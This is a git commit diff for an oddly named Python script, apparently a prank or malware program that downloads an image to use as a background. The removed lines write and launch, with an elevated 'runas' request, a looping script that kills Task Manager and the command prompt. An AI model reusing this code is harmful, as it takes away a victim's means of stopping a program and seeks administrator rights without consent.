fc36654bd2a053750975e7c41dea12c04388220b
Camelaoon <78298928+Camelaoon@users.noreply.github.com>
2021-02-01 09:27:12 +0100

    Update ʬ.py

--- ʬ.py
+++ ʬ.py
@@ -3,10 +3,6 @@ import requests
 import os, sys
 import ctypes
 import os
-dis = open("disable.pyw", "w")
-dis.write("import os\nwhile True:\n	os.system('taskkill /f /im taskmgr.exe')\n	os.system('taskkill /f /im cmd.exe')")
-dis.close()
-ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "disable.pyw", None, 1)
 response = requests.get("https://cdn.statically.io/img/wallpaperaccess.com/full/339632.jpg")
 file = open("bg.png", "wb")
 file.write(response.content)
